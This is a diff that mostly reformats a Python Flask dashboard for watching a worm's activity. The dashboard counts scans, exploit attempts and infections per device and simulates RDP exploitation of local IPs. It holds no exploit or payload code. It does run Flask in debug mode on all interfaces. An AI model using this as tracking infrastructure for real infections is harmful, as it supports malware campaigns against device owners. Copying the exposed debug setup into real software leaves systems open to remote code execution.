@@ -10,14 +10,14 @@ Live view of worm activity and infected devices
 """
 
 
-
-from flask import Flask, render_template_string, jsonify
+import os
+import sys
 import threading
 import time
-import sys
-import os
-from datetime import datetime
 from collections import deque
+from datetime import datetime
+
+from flask import Flask, jsonify, render_template_string
 
 # Add parent directory to path
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -30,100 +30,102 @@ class MonitoringDashboard:
     Real-time monitoring dashboard for worm activity
     Shows live activity feed and device status
     """
-    
+
     def __init__(self, port=8080):
         self.app = Flask(__name__)
         self.port = port
-        
+
         # Activity log (last 100 events)
         self.activity_log = deque(maxlen=100)
-        
+
         # Device tracking
         self.devices = {}  # ip -> device_info
-        
+
         # Statistics
         self.stats = {
-            'start_time': datetime.now(),
-            'total_scans': 0,
-            'total_exploits': 0,
-            'successful_infections': 0,
-            'failed_attempts': 0,
-            'active_agents': 0
+            "start_time": datetime.now(),
+            "total_scans": 0,
+            "total_exploits": 0,
+            "successful_infections": 0,
+            "failed_attempts": 0,
+            "active_agents": 0,
         }
-        
+
         self._setup_routes()
         logger.info(f"Monitoring dashboard initialized on port {port}")
-    
+
     def _setup_routes(self):
         """Setup Flask routes"""
-        
-        @self.app.route('/')
+
+        @self.app.route("/")
         def dashboard():
             return self.get_dashboard_html()
-        
-        @self.app.route('/api/activity')
+
+        @self.app.route("/api/activity")
         def get_activity():
             """Get recent activity"""
             return jsonify(list(self.activity_log))
-        
-        @self.app.route('/api/devices')
+
+        @self.app.route("/api/devices")
         def get_devices():
             """Get all devices"""
             return jsonify(list(self.devices.values()))
-        
-        @self.app.route('/api/stats')
+
+        @self.app.route("/api/stats")
         def get_stats():
             """Get statistics"""
-            uptime = (datetime.now() - self.stats['start_time']).total_seconds()
-            return jsonify({
-                **self.stats,
-                'uptime_seconds': uptime,
-                'uptime_formatted': self._format_uptime(uptime)
-            })
-    
+            uptime = (datetime.now() - self.stats["start_time"]).total_seconds()
+            return jsonify(
+                {
+                    **self.stats,
+                    "uptime_seconds": uptime,
+                    "uptime_formatted": self._format_uptime(uptime),
+                }
+            )
+
     def log_activity(self, activity_type: str, message: str, device_ip: str = None):
         """Log activity event"""
         event = {
-            'timestamp': datetime.now().isoformat(),
-            'type': activity_type,
-            'message': message,
-            'device_ip': device_ip
+            "timestamp": datetime.now().isoformat(),
+            "type": activity_type,
+            "message": message,
+            "device_ip": device_ip,
         }
         self.activity_log.append(event)
-        
+
         # Update stats
-        if activity_type == 'scan':
-            self.stats['total_scans'] += 1
-        elif activity_type == 'exploit':
-            self.stats['total_exploits'] += 1
-        elif activity_type == 'infection':
-            self.stats['successful_infections'] += 1
-        elif activity_type == 'failure':
-            self.stats['failed_attempts'] += 1
-    
+        if activity_type == "scan":
+            self.stats["total_scans"] += 1
+        elif activity_type == "exploit":
+            self.stats["total_exploits"] += 1
+        elif activity_type == "infection":
+            self.stats["successful_infections"] += 1
+        elif activity_type == "failure":
+            self.stats["failed_attempts"] += 1
+
     def update_device(self, ip: str, status: str, info: dict = None):
         """Update device information"""
         if ip not in self.devices:
             self.devices[ip] = {
-                'ip': ip,
-                'status': status,
-                'first_seen': datetime.now().isoformat(),
-                'last_updated': datetime.now().isoformat(),
-                'info': info or {}
+                "ip": ip,
+                "status": status,
+                "first_seen": datetime.now().isoformat(),
+                "last_updated": datetime.now().isoformat(),
+                "info": info or {},
             }
         else:
-            self.devices[ip]['status'] = status
-            self.devices[ip]['last_updated'] = datetime.now().isoformat()
+            self.devices[ip]["status"] = status
+            self.devices[ip]["last_updated"] = datetime.now().isoformat()
             if info:
-                self.devices[ip]['info'].update(info)
-    
+                self.devices[ip]["info"].update(info)
+
     def _format_uptime(self, seconds: float) -> str:
         """Format uptime in human-readable format"""
         hours = int(seconds // 3600)
         minutes = int((seconds % 3600) // 60)
         secs = int(seconds % 60)
         return f"{hours:02d}:{minutes:02d}:{secs:02d}"
-    
+
     def get_dashboard_html(self) -> str:
         """Generate HTML dashboard"""
         return """
@@ -432,12 +434,12 @@ class MonitoringDashboard:
 </body>
 </html>
         """
-    
+
     def run(self, debug=False):
         """Start monitoring dashboard"""
         logger.info(f"Starting monitoring dashboard on port {self.port}")
-        self.app.run(host='0.0.0.0', port=self.port, debug=debug, threaded=True)
-    
+        self.app.run(host="0.0.0.0", port=self.port, debug=debug, threaded=True)
+
     def run_background(self):
         """Run dashboard in background thread"""
         thread = threading.Thread(target=self.run, daemon=True)
@@ -449,6 +451,7 @@ class MonitoringDashboard:
 # Global dashboard instance
 _dashboard = None
 
+
 def get_dashboard(port=8080):
     """Get or create global dashboard instance"""
     global _dashboard
@@ -459,46 +462,46 @@ def get_dashboard(port=8080):
 
 if __name__ == "__main__":
     dashboard = MonitoringDashboard(port=8080)
-    
-    print("="*60)
+
+    print("=" * 60)
     print("MONITORING DASHBOARD")
-    print("="*60)
+    print("=" * 60)
     print(f"Dashboard: http://localhost:8080")
-    print("="*60)
-    
+    print("=" * 60)
+
     # Simulate some activity
     import random
-    
+
     def simulate_activity():
         time.sleep(2)
-        
-        ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']
-        
+
+        ips = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]
+
         for i in range(10):
             ip = random.choice(ips)
-            
+
             # Scan
-            dashboard.log_activity('scan', f'Scanning {ip}', ip)
-            dashboard.update_device(ip, 'scanning')
+            dashboard.log_activity("scan", f"Scanning {ip}", ip)
+            dashboard.update_device(ip, "scanning")
             time.sleep(1)
-            
+
             # Exploit
-            dashboard.log_activity('exploit', f'Attempting RDP exploit on {ip}', ip)
-            dashboard.update_device(ip, 'exploiting')
+            dashboard.log_activity("exploit", f"Attempting RDP exploit on {ip}", ip)
+            dashboard.update_device(ip, "exploiting")
             time.sleep(1)
-            
+
             # Result
             if random.random() > 0.5:
-                dashboard.log_activity('infection', f'Successfully infected {ip}', ip)
-                dashboard.update_device(ip, 'infected')
-                dashboard.stats['active_agents'] += 1
+                dashboard.log_activity("infection", f"Successfully infected {ip}", ip)
+                dashboard.update_device(ip, "infected")
+                dashboard.stats["active_agents"] += 1
             else:
-                dashboard.log_activity('failure', f'Exploit failed on {ip}', ip)
-                dashboard.update_device(ip, 'failed')
-            
+                dashboard.log_activity("failure", f"Exploit failed on {ip}", ip)
+                dashboard.update_device(ip, "failed")
+
             time.sleep(2)
-    
+
     # Start simulation in background
     threading.Thread(target=simulate_activity, daemon=True).start()
-    
+
     dashboard.run(debug=True)
